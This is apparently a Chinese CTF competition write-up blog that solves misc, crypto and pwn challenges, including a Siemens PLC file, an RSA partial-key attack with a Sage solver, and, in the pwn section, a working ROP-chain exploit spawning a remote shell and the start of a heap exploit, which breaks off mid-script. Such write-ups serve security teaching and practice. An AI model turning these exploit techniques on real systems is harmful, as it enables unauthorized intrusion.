<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109042231-00454086-fd1f-41ac-8f9c-2db3a0d06699-172838808283333.png" alt="img" data-caption="img" loading="lazy"></p>
<p>然后搞7个以上，兑换flag</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109087152-ac6c9339-7e76-41c6-9e3b-5b023ce5b76c-172838808283335.png" alt="img" data-caption="img" loading="lazy"></p>
<h4 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h4><p>下载下来的文件是mwp文件</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716110746420-df146dee-4c83-4ab1-ae06-d347920ff362-172838808283337.png" alt="img" data-caption="img" loading="lazy"></p>
<p>搜索发现是西门子的啥玩意，去官网下软件</p>
<p>然后就是西门子的，用STEP 7 MicroWIN SMART打开</p>
<p>但是没能成功打开，用010查看，发现文件头有误</p>
<p>补全文件头，然后就正常打开了</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716111609926-03e0e9df-e80d-4a19-83a3-ba4e51bad7bc-172838808283439.png" alt="img" data-caption="img" loading="lazy"></p>
<p>发现有备注信息，里面的内容是base64，解码得到flag</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716111652950-c343011b-6f6e-46e3-adbf-80080f1e5e4e-172838808283441.png" alt="img" data-caption="img" loading="lazy"></p>
<p>base64（没记错的话，大概率没记错）</p>
<h4 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h4><p>让gpt写个读npz文件的东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设你的 .npz 文件名是 &#x27;data.npz&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;attachment.npz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 .npz 文件</span></span><br><span class="line">data = np.load(filename)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印文件中包含的数组名称</span></span><br><span class="line"><span class="built_in">print</span>(data.files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问每个数组</span></span><br><span class="line"><span class="keyword">for</span> array_name <span class="keyword">in</span> data.files:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;array_name&#125;</span>: <span class="subst">&#123;data[array_name]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>通过input、index、trace的内容可以分析出，它大概有13组数据每组数据对应一幅图，有点类似键盘敲击的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">f = np.load(<span class="string">&#x27;attachment.npz&#x27;</span>)</span><br><span class="line">ip = f[<span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">tr = f[<span class="string">&#x27;trace&#x27;</span>]</span><br><span class="line"></span><br><span class="line">result_indices = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    trace_slice = tr[i * <span class="number">40</span>:(i + <span class="number">1</span>) * <span class="number">40</span>]</span><br><span class="line">    input_slice = ip[i * <span class="number">40</span>:(i + <span class="number">1</span>) * <span class="number">40</span>]</span><br><span class="line"></span><br><span class="line">    min_indices = [np.argmin(trace) <span class="keyword">for</span> trace <span class="keyword">in</span> trace_slice]</span><br><span class="line">    max_variation_index = np.argmax(min_indices)</span><br><span class="line">    result_indices.append(input_slice[max_variation_index])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, result_indices)))</span><br></pre></td></tr></table></figure>

<h4 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h4><p>将ppt文件转换为zip，文档打开找到，ppt信息里面也可以找到，懒得截图了</p>
<p>Part1:flag{e</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716106492580-26b1e005-7512-42d9-a272-151cd3f43b17-172838808283443.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107572564-18f01d74-a502-40d8-af18-9f2c23c4d3a4-172838808283445.png" alt="img" data-caption="img" loading="lazy"></p>
<p>（算了还是截了）</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107764486-62638e04-f9c4-4218-9de0-f56184826389-172838808283447.png" alt="img" data-caption="img" loading="lazy"></p>
<p>解密</p>
<p>part2:675efb</p>
<p>里面有个word，搞成zip解压</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107925246-fe0a3e99-3fbd-4c65-9069-b3e0db9b6c6d-172838808283449.png" alt="img" data-caption="img" loading="lazy"></p>
<p>接着凯撒爆破base64</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108031213-a6565110-6e74-4b6b-870b-4b311fdba2f9-172838808283451.png" alt="img" data-caption="img" loading="lazy"></p>
<p>PArt3:3-34</p>
<p>alt+F11打开vba代码</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108094760-e1590f14-1867-4228-8b08-26a43e592d5e-172838808283453.png" alt="img" data-caption="img" loading="lazy"></p>
<p>问gpt是RC4（一直以为要写解密脚本！！！）</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108192751-d5e40af9-9475-41b2-9ddc-31427c36089b-172838808283455.png" alt="img" data-caption="img" loading="lazy"></p>
<p>Payt4:6f-40</p>
<p>PPT给图片掀开</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108300557-25e6cd01-2729-47c5-9490-c04ef5a82deb-172838808283457.png" alt="img" data-caption="img" loading="lazy"></p>
<p>base64解密</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108384838-aa51d603-310f-4674-8b7f-5c29dec629ac-172838808283459.png" alt="img" data-caption="img" loading="lazy"></p>
<p>pArt5:5f-90d</p>
<p>第五页ppt</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108414303-ed12dfe7-8dfb-43f3-a604-53a7faa1c689-172838808283461.png" alt="img" data-caption="img" loading="lazy"></p>
<p>多轮base64解密</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108449233-8834d997-0c5b-4849-a675-1bb86e310e60-172838808283463.png" alt="img" data-caption="img" loading="lazy"></p>
<p>ParT6:d-2</p>
<p>还是改为zip解压出来的题目里找到的</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108629143-0d7aab51-366f-40f3-9ac2-efc31576b3bc-172838808283465.png" alt="img" data-caption="img" loading="lazy"></p>
<p>base64</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108642560-2fe27b40-d301-4b10-ac41-6d019d8c9fc8-172838808283467.png" alt="img" data-caption="img" loading="lazy"></p>
<p>PART7&#x3D;22b3</p>
<p>对</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108872948-8899a2b1-85d3-44ae-b15a-f932c3e3b90f-172838808283469.png" alt="img" data-caption="img" loading="lazy"></p>
<p>对</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109032598-2b029db2-3a2b-4d7b-9616-1b58cd646e07-172838808283471.png" alt="img" data-caption="img" loading="lazy"></p>
<p>对</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108989806-a7901a7e-b2f9-4b98-8e07-1f3dc64b0933-172838808283473.png" alt="img" data-caption="img" loading="lazy"></p>
<p>paRt8:87e</p>
<p>密文在前面，这回真不截了</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716106998432-8d9281e6-78d5-4767-9d57-2748fde14a80-172838808283475.png" alt="img" data-caption="img" loading="lazy"></p>
<p>替换也有提示懒得截了</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716106978866-2cbc8c98-b5a2-407f-8d7e-e5dc912f3eb9-172838808283477.png" alt="img" data-caption="img" loading="lazy"></p>
<p>parT9:dee</p>
<p>还是那个文件夹里</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109359865-6a66e95f-4841-419d-834f-82d27db8a1b6-172838808283479.png" alt="img" data-caption="img" loading="lazy"></p>
<p>解密</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109410500-69b85e2a-6fb6-4bbd-8f99-57042d6cb5bb-172838808283481.png" alt="img" data-caption="img" loading="lazy"></p>
<p>PARt10:9}</p>
<p>维吉尼亚 key也有懒得解了</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109807249-dfa68f6f-b9b1-428a-987a-d0dcfc97440b-172838808283483.png" alt="img" data-caption="img" loading="lazy"> </p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="OvO"><a href="#OvO" class="headerlink" title="OvO"></a>OvO</h4><p>sage原文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">p = getPrime(nbits)</span><br><span class="line">q = getPrime(nbits)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    kk = getPrime(<span class="number">128</span>)//<span class="number">128</span></span><br><span class="line">    rr = kk + <span class="number">2</span></span><br><span class="line">    e = <span class="number">65537</span> + kk * p + rr * ((p+<span class="number">1</span>) * (q+<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> gcd(e, phi) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">e = e &gt;&gt; <span class="number">200</span> &lt;&lt; <span class="number">200</span>	<span class="comment">#高位攻击</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line"><span class="string">e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line"><span class="string">c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>发现是e的高位攻击，然后搞出e与p的关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse, GCD</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> PolynomialRing, Zmod, RealField, ZZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_full_p</span>(<span class="params">p_high, n, d_high, bits</span>):</span><br><span class="line">    PR = PolynomialRing(Zmod(n), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    x = PR.gen()</span><br><span class="line">    f = x + p_high</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span> ** (bits + <span class="number">4</span>), beta=<span class="number">0.4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = GCD(x0 + p_high, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p_high</span>(<span class="params">e, n, bits</span>):</span><br><span class="line">    PR = PolynomialRing(RealField(<span class="number">1000</span>), <span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">    X = PR.gen()</span><br><span class="line">    rr = e // n</span><br><span class="line">    kk = rr - <span class="number">2</span></span><br><span class="line">    f = (kk + rr) * X ** <span class="number">2</span> + (rr * (n + <span class="number">1</span>) + <span class="number">65538</span>) * X + rr * n - e * X</span><br><span class="line">    results = f.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> results:</span><br><span class="line">        <span class="keyword">for</span> root <span class="keyword">in</span> results:</span><br><span class="line">            p_high = <span class="built_in">int</span>(root[<span class="number">0</span>]) &gt;&gt; <span class="number">4</span> &lt;&lt; <span class="number">4</span></span><br><span class="line">            p = get_full_p(p_high, n, e, bits)</span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">and</span> <span class="built_in">str</span>(p)[<span class="number">0</span>] == <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">    e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">    c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line">    p = find_p_high(e, n, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;p: <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;q: <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        rr = e // n</span><br><span class="line">        kk = rr - <span class="number">2</span></span><br><span class="line">        new_e = <span class="number">65537</span> + kk * p + rr * ((p + <span class="number">1</span>) * (q + <span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;e: <span class="subst">&#123;new_e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        d = inverse(new_e, phi_n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;d: <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        decrypted_message = long_to_bytes(m)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;decrypted_message&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># p: 9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061522496169870935934745091</span></span><br><span class="line"><span class="comment"># q: 11287710353955888973017088237331029225772085726230749705174733853385754367993775916873684714795084329569719147149432367637098107466393989095020167706071637</span></span><br><span class="line"><span class="comment"># e: 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226053225696381145049303216018329937626866082580192534109310743249</span></span><br><span class="line"><span class="comment"># d: 40562370691549621318549577950032175038658590691131469091909407935553676331176752570788349128822472320141028057032815128710763002566130430070603179406801031103153868717775020292889882861093052194287247276202665973400686789725153480640714911756153417332445558986048503928766869105149777013026905407852425839049</span></span><br><span class="line"><span class="comment"># flag: b&#x27;flag&#123;b5f771c6-18df-49a9-9d6d-ee7804f5416c&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h4><p>Atbash Cipher</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716110896418-ec5dd2d6-4731-47e9-ac78-acb22a0b554c-172838808283485.png" alt="img" data-caption="img" loading="lazy"></p>
<p>加上lg傻傻的交了一遍，发现不对，看到了lg再去栅栏解密一下</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716111008510-fded6daa-2ee9-45c9-987c-09eaecab185c-172838808283487.png" alt="img" data-caption="img" loading="lazy"></p>
<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h4><p>首先通过自动补全符号表来理解程序的结构和功能。接着，使用checksec工具检查可执行文件的安全特性，发现只开了NX，分析之后锁定溢出点</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">fname = <span class="string">&#x27;F:/betwen/题库/24国赛/gostack&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf = ELF(fname)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">rc=<span class="keyword">lambda</span> *args:p.recv(*args)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sd=<span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> a,b:p.sendafter(a,b)</span><br><span class="line">sla=<span class="keyword">lambda</span> a,b:p.sendlineafter(a,b)</span><br><span class="line">ls=<span class="keyword">lambda</span> *args:log.success(*args)</span><br><span class="line">ia=<span class="keyword">lambda</span> *args:p.interactive()</span><br><span class="line">pl=<span class="keyword">lambda</span> *args:<span class="built_in">print</span>(*args)</span><br><span class="line">ts=<span class="keyword">lambda</span> *args:time.sleep(*args)</span><br><span class="line">l8 = <span class="keyword">lambda</span> x:x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;8.147.128.251&quot;</span>,<span class="string">&quot;44715&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">        syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">        rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">        rdi_6_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">        rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">        rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">        ru(<span class="string">&#x27;message :&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(elf.bss())+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">0x18</span></span><br><span class="line">        payload += p64(rdi_6_ret)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(rsi_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(rdx_ret)+p64(<span class="number">0x100</span>)+p64(rax_ret)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">        payload += p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">        payload += p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">        payload += p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(rax_ret)+p64(<span class="number">59</span>)+p64(syscall)</span><br><span class="line">        sl(payload)</span><br><span class="line">        <span class="built_in">input</span>()</span><br><span class="line">        sd(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        ia()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<h4 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h4><p>house of orange free出一个unsorted chunk，然后泄露libc地址，用use after free劫持malloc hook即可</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;8.147.133.230&quot;</span>,<span class="string">&quot;33569&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;F:\pwn\libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span 